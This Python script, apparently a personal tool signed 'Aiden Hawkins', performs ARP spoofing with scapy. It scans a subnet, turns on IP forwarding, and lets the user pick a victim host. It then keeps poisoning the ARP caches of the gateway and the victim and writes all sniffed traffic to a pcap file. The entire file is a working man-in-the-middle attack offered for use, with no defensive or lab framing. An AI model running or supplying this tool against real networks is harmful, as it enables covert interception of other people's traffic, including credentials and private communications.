# sudo python3 poison.py -iprange ENTERIPHERE
import scapy.all as scapy
import subprocess
import sys
import time
import os
from ipaddress import IPv4Network
import threading

directory = os.getcwd()
# CHECKS IF SCRIPT IS RAN IN SUDO RETURNS WARNING AND EXITS IF RAN WITHOUT SUDO
def insudo():
    if not 'SUDO_UID' in os.environ.keys():
        print("RUN IN SUDO")
        exit()
# UTILIZES SCAPY ARP METHOD RETURNS RESPONSES
def arpscan(iprange):
    arpresponses = list()
    answeredlist = scapy.arping(iprange, verbose=0)[0]

    for res in answeredlist:
        arpresponses.append({"ip" : res[1].psrc, "mac" : res[1].hwsrc})

    return arpresponses
# CHECKS THE GATEWAY UTILIZING ARCH LINUX SUBPROCESS RETURNS TRUE IF FOUND
def isgateway(gatewayip):
    result = subprocess.run(["ip", "route"], capture_output=True).stdout.decode().split("\n")

    for row in result:
        if gatewayip in row:
            return True

    return False
# CHECKS AND RETURNS INTERFACE NAMES STORED IN DIRECTORY
def getinterfacenames():
    os.chdir("/sys/class/net")

    interfacenames = os.listdir()

    return interfacenames
# CHECKS IF INTERFACE IS PRESENT IN ROW AND RETURNS INTERFACE NAME
def matchifacename(row):
    interfacenames = getinterfacenames()

    for iface in interfacenames:
        if iface in row:
            return iface
# TAKES AND APPENDS GATEWAY INFORMATION FOR THE SNIFFER FUNCTION
def gatewayinfo(networkinfo):
    result = subprocess.run(["ip","route"], capture_output=True).stdout.decode().split("\n")

    gateways = []

    for iface in networkinfo:
        for row in result:
            if iface["ip"] in row:
                ifacename = matchifacename(row)
                gateways.append({"iface" : ifacename, "ip" : iface["ip"], "mac" : iface["mac"]})
    
    return gateways
# RETURNS LIST OF CLIENTS WITH GATEWAYS REMOVED 
def clients(arpres, gatewayres):
    clientlist = []
    for gateway in gatewayres:
        for item in arpres:
            if gateway["ip"] != item["ip"]:
                clientlist.append(item)
    
    return clientlist
# ENABLES IP FORWARDING
def allowipforwarding():
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
    subprocess.run(["sysctl", "-p", "/etc/sysctl.d/99-sysctl.conf"], check=True)
# RUNS SPOOFING METHOD UPDATING ARP TABLES TWICE ONCE WITH GATEWAY IP AND MAC THEN AGAIN WITH IP AND MAC OF TARGET
def arpspoofer(targetip, targetmac, spoofip):
    pkt = scapy.ARP(op=2, pdst=targetip, hwdst=targetmac, psrc=spoofip)
    scapy.send(pkt, verbose=False)
# SENDS SPOOF PACKETS TO THE GATEWAY AND TARGET DEVICE
def sendspoofpackets():
    while True:
        arpspoofer(gatewayinfo["ip"], gatewayinfo["mac"], nodetospoof["ip"])
        arpspoofer(nodetospoof["ip"], nodetospoof["mac"], gatewayinfo["ip"])
        time.sleep(3)
# USES SNIFF FUNCTION TO CATCH PACKETS GOING THROUGH GATEWAY
def packetsniffer(interface):
    packets = scapy.sniff(iface = interface, store = False, prn = processsniffedpkt)
# WRITES PACKETS SNIFFED TO PCAP FILE
def processsniffedpkt(pkt):
    print("WRITING TO PCAP, CTRL C TO EXIT")
    scapy.wrpcap("requests.pcap", pkt, append=True)
# PRINTS VISUAL MENU WHERE YOU CAN PICK A CACHE TO POISON
def printarpres(arpres):
    print("!7!777777777777777777777777777!7!")
    print("5@#J!!7777777777777777777777!J#@5")
    print(" Y@#J.                     .J#@Y ")
    print("  Y@#J.                   .J#@Y  ")
    print("   ?&Y5#J.             .J#5Y&?   ")
    print("    7&7^PB?.         .?BP^?&7    ")
    print("     !@J ~GB7       7BG~ J@!     ")
    print("      ~&Y  ~GB!   7BG~  Y&~      ")
    print("       ^&5   !GG?GG!   5&^       ")
    print("        ^#P.  !&&&~  .P#:        ")
    print("         :BG~PB7.7BP~GB:         ")
    print("          ~@@Y     Y@@~          ")
    print("        ^5B?PB:   :BP?B5^        ")
    print("      :5#Y.  5&^ ^&5  .Y#Y:      ")
    print("     ?#Y:     Y#?&Y     :Y#?     ")
    print("     ^:        P@P        :^     ")
    print("         ::::.7&P&7.:::.         ")
    print("         7YB#G&7 7&B#&5!         ")
    print("     7Y:   ^&@!   !@@?   :Y7     ")
    print("    ^@P.  ^PBBP. .P@#5^  :P@^    ")
    print("    .YBYJPGJ..BG^G@!.JGPJYBY     ")
    print("      :~~^.   .P@&~   .^~~:      ")
    print("               .!^               ")
    print("                                 ")
    print("          AIDEN HAWKINS          \n\n")
    for id, res in enumerate(arpres):
        print("{}\t\t{}\t\t{}".format(id,res['ip'], res['mac']))
    while True:
        try:
            choice = int(input("SELECT ID OF TARGET COMPUTER, CTRL Z TO EXIT\n"))
            if arpres[choice]:
                return choice
        except:
            print("INVALID CHOICE, RE ENTER")
# GETS CMD ARGS FOR VALIDATION
def getcmdarguments():
    iprange = None
    if len(sys.argv) - 1 > 0 and sys.argv[1] != "-iprange":
        print("-iprange FLAG NOT SPECIFIED")
        return iprange
    elif len(sys.argv) - 1 > 0 and sys.argv[1] == "-iprange":
        try:
            print(f"{IPv4Network(sys.argv[2])}")
            iprange = sys.argv[2]
            print("VALID IP RANGE")
        except:
            print("INVALID ARGUMENT")

    return iprange
# RUNS FUNCTIONS TO EXECUTE PROGRAM
insudo()
iprange = getcmdarguments()

if iprange == None:
    print("INVALID IP RANGE, EXITING")
    exit()

allowipforwarding()
arpres = arpscan(iprange)

if len(arpres) == 0:
    print("NO CONNECTION, EXITING")
    exit()

gateways = gatewayinfo(arpres)
gatewayinfo = gateways[0]
clientinfo = clients(arpres, gateways)

if len(clientinfo) == 0:
    print("CLIENTS NOT FOUND, EXITING")

choice = printarpres(clientinfo)
nodetospoof = clientinfo[choice]
t1 = threading.Thread(target=sendspoofpackets, daemon=True)
t1.start()
os.chdir(directory)
packetsniffer(gatewayinfo["iface"])

